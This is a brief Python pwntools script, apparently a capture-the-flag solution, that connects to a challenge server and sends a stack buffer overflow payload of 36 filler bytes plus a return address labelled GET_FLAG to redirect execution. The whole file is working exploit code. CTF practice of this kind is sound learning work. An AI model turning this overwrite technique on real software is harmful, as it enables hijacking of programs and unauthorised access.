from pwn import *
s = remote('boofy.tghack.no' ,6003)
OFFSET= 36
GET_FLAG = 0x8048486
# nc boofy.tghack.no 6003
payload = 'A'*36
payload += p32(GET_FLAG)
print payload


print s.recvuntil('password?\n')
s.send(payload)
print s.recv()